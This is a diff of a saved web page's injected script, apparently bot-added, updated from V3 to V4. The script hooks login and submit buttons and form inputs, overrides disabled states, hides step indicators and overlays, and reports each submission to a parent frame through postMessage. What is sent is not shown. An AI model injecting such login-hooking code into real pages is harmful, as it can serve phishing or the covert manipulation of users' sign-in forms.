@@ -32,29 +32,16 @@
 <script type=application/ld+json>[]</script>
 <script type=application/ld+json>[]</script>
 <meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>
-<!-- GENERIC FIX INJECTED BY BOT V3 -->
+
+<!-- GENERIC FIX INJECTED BY BOT V4 -->
 <script>
 (function(){
   var DISABLED_CLASS_RE = /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn|_disabled|-disabled/i;
   var lastSubmittedAt = 0;
-  function ultraClick(btn){
-    try{
-      try{ btn.click(); }catch(e){}
-      try{
-        if(btn.dispatchEvent){
-          try{ btn.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,view:window})); }catch(e){}
-          try{ btn.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,view:window})); }catch(e){}
-          try{ btn.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window})); }catch(e){}
-          try{ btn.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true})); }catch(e){}
-          try{ btn.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true})); }catch(e){}
-        }
-      }catch(e){}
-    }catch(e){}
-  }
   function notifyParentAndTryForm(btnOrInput){
     try{
       var now = Date.now();
-      if(now - lastSubmittedAt < 1200) return;
+      if(now - lastSubmittedAt < 1400) return;
       lastSubmittedAt = now;
       try{
         if(window.parent && window.parent.postMessage){
@@ -81,7 +68,6 @@
           }catch(e2){}
         }
       }catch(e){}
-      try{ ultraClick(btnOrInput); }catch(e){}
       var ev;
       try{
         if(typeof Event === 'function'){ ev = new Event('submit', { bubbles: true, cancelable: true }); }
@@ -104,21 +90,6 @@
           el.setAttribute('aria-hidden','true');
         }catch(e){}
       });
-      try{
-        var allDivs = document.querySelectorAll('div, span, section');
-        for(var i=0;i<allDivs.length;i++){
-          var d = allDivs[i];
-          var zs = getComputedStyle(d).zIndex;
-          var zi = parseInt(zs,10);
-          if(!isNaN(zi) && zi >= 999){
-            try{
-              d.style.setProperty('z-index','-1','important');
-              d.style.pointerEvents = 'none';
-              d.style.setProperty('display','none','important');
-            }catch(e){}
-          }
-        }
-      }catch(e){}
     }catch(e){}
     try{
       var stepEls = document.querySelectorAll('[class*="step"], [id*="step"], [class*="Step"], [id*="Step"], [class*="indicator"], [id*="indicator"], [id*="progressbar"], [id*="progress-bar"], [class*="progress-bar"], [class*="progress"]');
@@ -188,24 +159,16 @@
     try{
       var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"]');
       buttons.forEach(function(btn){
-        if(!btn._gfBotHookedV3){
-          btn._gfBotHookedV3 = true;
-          var handler = function(e){
-            try{ ultraClick(btn); }catch(err){}
-            try{ notifyParentAndTryForm(btn); }catch(err){}
-          };
-          try{ btn.addEventListener('click', handler, true); }catch(e){}
-          try{ btn.addEventListener('mousedown', handler, true); }catch(e){}
-          try{ btn.addEventListener('touchend', handler, true); }catch(e){}
+        if(!btn._gfBotHookedV4){
+          btn._gfBotHookedV4 = true;
+          var handler = function(e){ try{ notifyParentAndTryForm(btn); }catch(err){} };
+          try{ btn.addEventListener('click', handler, false); }catch(e){}
+          try{ btn.addEventListener('mousedown', handler, false); }catch(e){}
+          try{ btn.addEventListener('touchend', handler, false); }catch(e){}
           try{
             btn.addEventListener('keydown', function(e){
               if(e && (e.key === 'Enter' || e.keyCode === 13)){ handler(e); }
-            }, true);
-          }catch(e){}
-          try{
-            btn.addEventListener('keyup', function(e){
-              if(e && (e.key === ' ' || e.keyCode === 32)){ try{ e.preventDefault(); }catch(e2){} handler(e); }
-            }, true);
+            }, false);
           }catch(e){}
         }
       });
@@ -213,14 +176,14 @@
     try{
       var allInputs = document.querySelectorAll('form input, form select, form textarea');
       allInputs.forEach(function(inp){
-        if(!inp._gfBotEnterHookedV3){
-          inp._gfBotEnterHookedV3 = true;
+        if(!inp._gfBotEnterHookedV4){
+          inp._gfBotEnterHookedV4 = true;
           try{
             inp.addEventListener('keydown', function(e){
               if(e && (e.key === 'Enter' || e.keyCode === 13)){
                 try{ notifyParentAndTryForm(inp); }catch(err){}
               }
-            }, true);
+            }, false);
           }catch(e){}
         }
       });
@@ -237,11 +200,10 @@
     });
   }catch(e){}
   try{ runFix(); }catch(e){}
-  try{ setTimeout(runFix, 30); }catch(e){}
-  try{ setTimeout(runFix, 100); }catch(e){}
-  try{ setTimeout(runFix, 300); }catch(e){}
-  try{ setTimeout(runFix, 700); }catch(e){}
-  try{ setInterval(runFix, 200); }catch(e){}
+  try{ setTimeout(runFix, 150); }catch(e){}
+  try{ setTimeout(runFix, 500); }catch(e){}
+  try{ setTimeout(runFix, 1500); }catch(e){}
+  try{ setInterval(runFix, 900); }catch(e){}
   try{
     if(document.readyState === 'loading'){
       document.addEventListener('DOMContentLoaded', runFix);
